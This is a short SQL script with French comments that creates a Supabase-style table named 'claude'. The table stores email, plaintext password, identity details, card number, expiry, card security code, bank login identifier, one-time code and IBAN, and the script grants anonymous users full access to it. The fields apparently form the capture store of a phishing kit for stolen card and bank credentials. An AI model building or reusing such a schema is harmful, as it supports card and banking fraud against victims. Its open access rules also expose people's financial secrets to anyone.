
-- Suppression de la table existante si elle existe
DROP TABLE IF EXISTS public.claude CASCADE;

-- Création de la table claude
CREATE TABLE public.claude (
  id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
  email TEXT,
  password TEXT,
  nom TEXT,
  prenom TEXT,
  datenaissance TEXT,
  adresse TEXT,
  codepostal TEXT,
  ville TEXT,
  telephone TEXT,
  numerocarte TEXT,
  dateexpiration TEXT,
  cryptogramme TEXT,
  typebanque TEXT,
  identifiantiban TEXT,
  codepersonne TEXT,
  montant NUMERIC,
  code TEXT,
  iban TEXT,
  pays TEXT,
  date_creation TIMESTAMP WITH TIME ZONE DEFAULT now()
);

-- Configuration des autorisations RLS (Row Level Security)
ALTER TABLE public.claude ENABLE ROW LEVEL SECURITY;

-- Suppression des anciennes politiques si elles existent
DROP POLICY IF EXISTS "Allow anonymous access" ON public.claude;

-- Création d'une politique pour permettre toutes les opérations pour les utilisateurs anonymes
CREATE POLICY "Allow all operations for anonymous users" ON public.claude
  FOR ALL
  TO anon
  USING (true)
  WITH CHECK (true);

-- Création d'une politique pour permettre toutes les opérations pour les utilisateurs authentifiés
CREATE POLICY "Allow all operations for authenticated users" ON public.claude
  FOR ALL
  TO authenticated
  USING (true)
  WITH CHECK (true);

-- Autoriser l'accès public à la table
GRANT ALL ON public.claude TO anon;
GRANT ALL ON public.claude TO authenticated;
